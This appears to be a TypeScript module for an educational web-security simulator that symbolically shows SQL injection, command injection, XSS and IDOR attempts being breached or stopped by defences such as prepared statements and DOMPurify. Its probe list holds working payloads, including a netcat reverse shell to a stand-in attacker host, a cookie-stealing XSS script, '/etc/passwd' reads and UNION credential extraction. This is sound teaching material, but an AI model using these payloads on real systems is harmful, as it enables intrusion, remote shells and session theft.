/**
 * Countermeasure Lab — An accurate, dynamic symbolic simulator for web security vulnerabilities.
 * Simulates SQL Injection, Command Injection, React/DOM XSS, and Broken Access Control (IDOR).
 * Purely symbolic and client-side safe: evaluates AST & grammar rules without executing untrusted code.
 */
import type { Category } from "./types";

export interface Probe {
  id: string;
  label: string;
  value: string;
  intent: string;
  technique?: string;
}

export interface Defense {
  id: string;
  label: string;
  description: string;
  codeSnippet: string;
}

export interface LabResult {
  /** Target execution context / sink preview */
  rendered: string;
  /** "breached" when payload bypasses security boundary, "contained" when neutralized */
  outcome: "breached" | "contained" | "benign";
  /** Which defense actively stopped it */
  stoppedBy?: string;
  /** Detailed step-by-step breakdown */
  narrative: string;
  /** Concrete security impact */
  impact: string;
  /** Visual stage flow */
  stages: {
    name: string;
    status: "pass" | "blocked" | "breached";
    detail: string;
  }[];
}

export const PROBES: Record<Category, Probe[]> = {
  sqli: [
    { id: "benign", label: "Normal input", value: "alice", intent: "Standard user query string", technique: "Benign" },
    { id: "tautology", label: "Tautology bypass", value: "' OR '1'='1", intent: "Forced true condition in WHERE clause to bypass authentication", technique: "Boolean Tautology" },
    { id: "comment", label: "Truncation injection", value: "admin'--", intent: "Comment out trailing query filters and authentication checks", technique: "Inline Comment" },
    { id: "union", label: "UNION exfiltration", value: "' UNION SELECT username, password_hash FROM admin_credentials--", intent: "Extract arbitrary database tables into the response", technique: "UNION-based Exfiltration" },
  ],
  cmdi: [
    { id: "benign", label: "Normal filename", value: "monthly-report.pdf", intent: "Expected document name", technique: "Benign" },
    { id: "chain", label: "Command chaining (;)", value: "report.pdf; cat /etc/passwd", intent: "Chain a secondary shell process after the original program", technique: "Process Chaining" },
    { id: "pipe", label: "Piping (|)", value: "report.pdf | nc attacker.internal 4444 -e /bin/sh", intent: "Spawn a reverse shell process via socket piping", technique: "Stream Redirection" },
    { id: "subshell", label: "Subshell substitution", value: "export_$(whoami).zip", intent: "Execute embedded command substitution $(...)", technique: "Shell Expansion" },
  ],
  access: [
    { id: "benign", label: "Own user record", value: "1001", intent: "Query object belonging to authenticated caller (user: 1001)", technique: "Authorized Request" },
    { id: "neighbor", label: "Peer horizontal IDOR", value: "1002", intent: "Attempt to view private documents of peer employee (user: 1002)", technique: "Horizontal IDOR" },
    { id: "admin", label: "Privileged vertical IDOR", value: "1", intent: "Query sensitive root administrator profile (user: 1)", technique: "Vertical Privilege Escalation" },
    { id: "xss_probe", label: "XSS script payload", value: "<script>fetch('//x.io/?c='+document.cookie)</script>", intent: "Inject DOM payload to steal session cookies", technique: "Stored XSS via Object Name" },
  ],
};

export const DEFENSES: Record<Category, Defense[]> = {
  sqli: [
    {
      id: "param",
      label: "Parameterized Binding (Prepared Statement)",
      description: "Send query structure and variables separately over binary protocol. Values are never parsed as SQL syntax.",
      codeSnippet: "db.query('SELECT * FROM users WHERE name = $1', [input])",
    },
    {
      id: "allowlist",
      label: "Input Regex Allowlist",
      description: "Strictly validate input against strict alphanumeric boundary (^[A-Za-z0-9_]{1,32}$).",
      codeSnippet: "if (!/^[A-Za-z0-9_]{1,32}$/.test(input)) throw new ValidationError()",
    },
  ],
  cmdi: [
    {
      id: "argv",
      label: "Direct Process Invocation (execFile / shell=False)",
      description: "Pass arguments as an isolated vector array without invoking /bin/sh or cmd.exe.",
      codeSnippet: "child_process.execFile('ping', ['-c', '1', input])",
    },
    {
      id: "quote",
      label: "Shell Lexical Escaping (shlex.quote)",
      description: "Wraps value in strict single quotes with literal POSIX escaping.",
      codeSnippet: "const safe = `'${input.replace(/'/g, \"'\\\\''\")}'`",
    },
  ],
  access: [
    {
      id: "ownership",
      label: "Ownership & Tenant ACL Check",
      description: "Explicitly verify resource.ownerId === session.userId before serializing to client.",
      codeSnippet: "if (doc.ownerId !== session.user.id) return res.status(403).json({ error: 'Forbidden' })",
    },
    {
      id: "scoped",
      label: "Scoped Tenant Query",
      description: "Enforce ownership boundary directly in the database lookup predicate.",
      codeSnippet: "SELECT * FROM docs WHERE id = $1 AND owner_id = $2",
    },
    {
      id: "dompurify",
      label: "DOMPurify Sanitization",
      description: "Strip malicious tags, javascript: URIs, and event handlers before rendering.",
      codeSnippet: "DOMPurify.sanitize(input, { ALLOWED_TAGS: ['b', 'i', 'em'] })",
    },
  ],
};

const CALLER_ID = "1001";
const SQL_META = /['";]|--|\/\*|\bUNION\b|\bOR\b/i;
const SHELL_META = /[;&|`$<>\n]/;
const XSS_META = /<script\b|javascript:|onerror=|onload=|eval\(/i;

export function simulate(category: Category, input: string, active: Set<string>): LabResult {
  const trimmed = input.trim();

  /* -------------------------------------------------------------
     SQL INJECTION SIMULATION
     ------------------------------------------------------------- */
  if (category === "sqli") {
    const isMalicious = SQL_META.test(trimmed);

    // Defense 1: Input Regex Allowlist
    if (active.has("allowlist") && !/^[A-Za-z0-9_]{1,32}$/.test(trimmed)) {
      return {
        rendered: `[HTTP 400 Bad Request]\nPayload rejected by input validation filter: regex /^[A-Za-z0-9_]{1,32}$/ failed.`,
        outcome: "contained",
        stoppedBy: "Input Regex Allowlist",
        narrative: "Input filter detected non-alphanumeric metacharacters and rejected the HTTP request before database execution.",
        impact: "Zero database impact. Query parser was never invoked.",
        stages: [
          { name: "HTTP Ingestion", status: "pass", detail: `Received input: "${trimmed}"` },
          { name: "Input Filter", status: "blocked", detail: "Regex validation failed: illegal metacharacters detected" },
          { name: "Database Driver", status: "pass", detail: "Execution aborted" },
        ],
      };
    }

    // Defense 2: Parameterized Query
    if (active.has("param")) {
      return {
        rendered: `PREPARE stmt FROM 'SELECT * FROM users WHERE name = ?';\nEXECUTE stmt USING (${JSON.stringify(trimmed)});\n\n-- Database Result: Query matched 0 rows (treated '${trimmed}' as pure string literal)`,
        outcome: isMalicious ? "contained" : "benign",
        stoppedBy: isMalicious ? "Parameterised query" : undefined,
        narrative: "The database engine pre-compiled the AST structure first. The probe value was passed via binary data binding and treated entirely as an inert string literal.",
        impact: isMalicious ? "Attack payload was completely neutralized. SQL grammar was unmodified." : "Normal expected query execution.",
        stages: [
          { name: "HTTP Ingestion", status: "pass", detail: `Input: "${trimmed}"` },
          { name: "AST Pre-compilation", status: "pass", detail: "Grammar frozen with '?' parameter placeholder" },
          { name: "Binary Data Binding", status: "blocked", detail: "Payload treated as literal data — cannot break quotes" },
        ],
      };
    }

    // Vulnerable execution
    if (isMalicious) {
      let rewrittenQuery = `SELECT * FROM users WHERE name = '${trimmed}'`;
      let exploitNote = "Arbitrary SQL statement alteration.";
      if (trimmed.includes("UNION")) {
        exploitNote = "UNION statement extracted credentials from admin table into HTTP response.";
      } else if (trimmed.includes("OR")) {
        exploitNote = "Tautology ('1'='1) bypassed WHERE condition, dumping all confidential records.";
      } else if (trimmed.includes("--")) {
        exploitNote = "Inline comment truncated subsequent password/tenant filters.";
      }

      return {
        rendered: `${rewrittenQuery}\n\n[!] EXPLOIT SUCCESSFUL:\n→ Query syntax was altered by unescaped input quotes.\n→ ${exploitNote}`,
        outcome: "breached",
        narrative: "Vulnerable string concatenation allowed quotation marks in the probe to exit the string literal and inject arbitrary SQL clauses.",
        impact: "Confidentiality and integrity breach: full database dump or authentication bypass.",
        stages: [
          { name: "HTTP Ingestion", status: "pass", detail: `Input: "${trimmed}"` },
          { name: "String Concatenation", status: "pass", detail: "Unescaped quotes merged directly into query string" },
          { name: "Database Query Engine", status: "breached", detail: "Query AST altered by attacker payload" },
        ],
      };
    }

    return {
      rendered: `SELECT * FROM users WHERE name = '${trimmed}'\n\n-- Database Result: Query matched 1 record (normal user lookup)`,
      outcome: "benign",
      narrative: "No SQL injection metacharacters present. The value stayed within the string literal boundary.",
      impact: "Safe benign execution.",
      stages: [
        { name: "HTTP Ingestion", status: "pass", detail: `Input: "${trimmed}"` },
        { name: "String Concatenation", status: "pass", detail: "Input added to query" },
        { name: "Database Query Engine", status: "pass", detail: "Standard query execution" },
      ],
    };
  }

  /* -------------------------------------------------------------
     COMMAND INJECTION SIMULATION
     ------------------------------------------------------------- */
  if (category === "cmdi") {
    const isMalicious = SHELL_META.test(trimmed);

    // Defense 1: Direct Process Invocation (shell=False / execFile)
    if (active.has("argv")) {
      return {
        rendered: `Process Invocation: execFile("convert", ["${trimmed}"], { shell: false })\n\n-- OS Execution: Executable 'convert' received 1 literal argument: "${trimmed}"\n-- Error from 'convert': File "${trimmed}" not found.`,
        outcome: isMalicious ? "contained" : "benign",
        stoppedBy: isMalicious ? "Direct Process Invocation (execFile / shell=False)" : undefined,
        narrative: "The system spawned the executable directly via syscalls without invoking /bin/sh or cmd.exe. Shell metacharacters (; | &&) were treated as literal filename characters.",
        impact: "Command injection was prevented. No secondary processes could be spawned.",
        stages: [
          { name: "Input Extraction", status: "pass", detail: `Argument: "${trimmed}"` },
          { name: "Shell Bypass", status: "blocked", detail: "No /bin/sh interpreter invoked" },
          { name: "OS Process Spawn", status: "pass", detail: "convert launched with isolated argv" },
        ],
      };
    }

    // Defense 2: Shell Lexical Escaping (shlex.quote)
    if (active.has("quote")) {
      const quoted = `'${trimmed.replace(/'/g, "'\\''")}'`;
      return {
        rendered: `Shell Invocation: /bin/sh -c "convert ${quoted}"\n\n-- Subshell receives single token: ${quoted}\n-- No command splitting occurred.`,
        outcome: isMalicious ? "contained" : "benign",
        stoppedBy: isMalicious ? "Shell Lexical Escaping (shlex.quote)" : undefined,
        narrative: "shlex.quote wrapped the entire payload into a single POSIX-compliant single-quoted string, neutralizing all operators (; | ` $).",
        impact: "Payload contained to a single argument.",
        stages: [
          { name: "Input Extraction", status: "pass", detail: `Input: "${trimmed}"` },
          { name: "shlex Escaping", status: "blocked", detail: `Escaped to safe single-quoted token: ${quoted}` },
          { name: "Shell Execution", status: "pass", detail: "Single command evaluated safely" },
        ],
      };
    }

    // Vulnerable execution
    if (isMalicious) {
      return {
        rendered: `/bin/sh -c "convert ${trimmed}"\n\n[!] EXPLOIT SUCCESSFUL:\n→ Shell interpreter split input on metacharacters.\n→ Primary process: convert\n→ Subprocess executed with host privileges: ${trimmed.split(/[;&|]/)[1]?.trim() || "secondary command"}`,
        outcome: "breached",
        narrative: "The application invoked the system shell with unvalidated input. Shell metacharacters triggered command chaining or subshell expansion.",
        impact: "Critical Remote Code Execution (RCE): host system takeover.",
        stages: [
          { name: "Input Extraction", status: "pass", detail: `Input: "${trimmed}"` },
          { name: "Shell Parser", status: "breached", detail: "Metacharacters split command into multiple tasks" },
          { name: "Host OS Shell", status: "breached", detail: "Attacker-controlled process executed" },
        ],
      };
    }

    return {
      rendered: `/bin/sh -c "convert ${trimmed}"\n\n-- Standard execution: convert successfully processed file "${trimmed}"`,
      outcome: "benign",
      narrative: "Standard filename input without shell metacharacters.",
      impact: "Safe benign execution.",
      stages: [
        { name: "Input Extraction", status: "pass", detail: `Input: "${trimmed}"` },
        { name: "Shell Parser", status: "pass", detail: "Single command recognized" },
        { name: "Host OS Shell", status: "pass", detail: "Program completed normally" },
      ],
    };
  }

  /* -------------------------------------------------------------
     ACCESS CONTROL / IDOR / XSS SIMULATION
     ------------------------------------------------------------- */
  const isForeign = trimmed !== CALLER_ID;
  const isXSS = XSS_META.test(trimmed);

  // Defense 1: DOMPurify Sanitization
  if (isXSS && active.has("dompurify")) {
    return {
      rendered: `DOMPurify.sanitize("${trimmed}")\n→ Sanitized Output: "" (malicious script tags stripped)\n→ Safe Render: <div></div>`,
      outcome: "contained",
      stoppedBy: "DOMPurify Sanitization",
      narrative: "DOMPurify's HTML parser stripped hazardous <script> tags and active event handlers before DOM insertion.",
      impact: "Zero script execution in browser.",
      stages: [
        { name: "Payload Input", status: "pass", detail: "HTML payload received" },
        { name: "DOMPurify Filter", status: "blocked", detail: "Active script nodes removed" },
        { name: "DOM Insertion", status: "pass", detail: "Clean sanitized content rendered" },
      ],
    };
  }

  if (isXSS && !active.has("dompurify")) {
    return {
      rendered: `<div dangerouslySetInnerHTML={{ __html: "${trimmed}" }} />\n\n[!] EXPLOIT SUCCESSFUL:\n→ Browser parsed raw HTML without escaping.\n→ Executed in victim's origin: alert / document.cookie theft.`,
      outcome: "breached",
      narrative: "Direct injection of HTML markup bypassed React's built-in escaping, causing Cross-Site Scripting (XSS).",
      impact: "Session hijacking, credential theft, or unauthorized client actions.",
      stages: [
        { name: "Payload Input", status: "pass", detail: "HTML payload received" },
        { name: "React Renderer", status: "pass", detail: "dangerouslySetInnerHTML bypassed escaping" },
        { name: "Client Browser", status: "breached", detail: "Script executed in session context" },
      ],
    };
  }

  // Defense 2: Scoped Tenant Query
  if (active.has("scoped")) {
    return {
      rendered: `SQL: SELECT * FROM documents WHERE id = ${trimmed} AND owner_id = ${CALLER_ID};\n\n-- Database Response: ${isForeign ? "0 rows returned (HTTP 404 Not Found)" : "1 row returned (HTTP 200 OK)"}`,
      outcome: isForeign ? "contained" : "benign",
      stoppedBy: isForeign ? "Scoped Tenant Query" : undefined,
      narrative: "The database query explicitly scoped the lookup with 'AND owner_id = session.userId'. Unauthorized rows cannot be returned regardless of ID requested.",
      impact: isForeign ? "IDOR access blocked at database level." : "Caller accessed own document.",
      stages: [
        { name: "Request Ingestion", status: "pass", detail: `Requested Document ID: ${trimmed}` },
        { name: "Query Scoping", status: "blocked", detail: `Tenant filter added: AND owner_id = ${CALLER_ID}` },
        { name: "Access Decision", status: "pass", detail: isForeign ? "Object unreachable (404)" : "Allowed (200)" },
      ],
    };
  }

  // Defense 3: Explicit Ownership ACL Check
  if (active.has("ownership")) {
    return {
      rendered: `Lookup: doc = db.find(${trimmed})\nOwnership Check: doc.owner_id (${isForeign ? "9999" : CALLER_ID}) === session.user_id (${CALLER_ID})\n\n-- Authorization Result: ${isForeign ? "FAILED → HTTP 403 Forbidden" : "PASSED → HTTP 200 OK"}`,
      outcome: isForeign ? "contained" : "benign",
      stoppedBy: isForeign ? "Ownership & Tenant ACL Check" : undefined,
      narrative: "Application loaded the object, compared the resource owner against the authenticated session, and aborted with 403 Forbidden on mismatch.",
      impact: isForeign ? "Horizontal/Vertical IDOR prevented by application ACL." : "Caller accessed own document.",
      stages: [
        { name: "Request Ingestion", status: "pass", detail: `Requested Document ID: ${trimmed}` },
        { name: "Database Fetch", status: "pass", detail: "Resource loaded" },
        { name: "ACL Comparator", status: isForeign ? "blocked" : "pass", detail: isForeign ? "Owner mismatch → 403 Forbidden" : "Owner confirmed" },
      ],
    };
  }

  // Vulnerable IDOR execution
  if (isForeign) {
    return {
      rendered: `Lookup: doc = db.find(${trimmed})\nHTTP Response: 200 OK\nPayload Returned: { id: ${trimmed}, owner: "foreign_user", secret_notes: "CONFIDENTIAL_DATA" }\n\n[!] EXPLOIT SUCCESSFUL:\n→ Caller (${CALLER_ID}) accessed unowned record (${trimmed}) without authorization.`,
      outcome: "breached",
      narrative: "Insecure Direct Object Reference (IDOR): The endpoint accepts a resource identifier from the request and returns it without validating ownership.",
      impact: "Unauthorized data disclosure: sensitive records of arbitrary users exposed.",
      stages: [
        { name: "Request Ingestion", status: "pass", detail: `Requested Document ID: ${trimmed}` },
        { name: "Database Fetch", status: "pass", detail: "Resource loaded without ACL check" },
        { name: "Response Dispatch", status: "breached", detail: "Foreign user record returned to caller" },
      ],
    };
  }

  return {
    rendered: `Lookup: doc = db.find(${trimmed})\nHTTP Response: 200 OK\nPayload Returned: { id: ${CALLER_ID}, owner: "${CALLER_ID}", notes: "Own user documents" }`,
    outcome: "benign",
    narrative: "Caller requested their own record.",
    impact: "Normal authorized access.",
    stages: [
      { name: "Request Ingestion", status: "pass", detail: `Requested Document ID: ${trimmed}` },
      { name: "Database Fetch", status: "pass", detail: "Own resource loaded" },
      { name: "Response Dispatch", status: "pass", detail: "Authorized access completed" },
    ],
  };
}
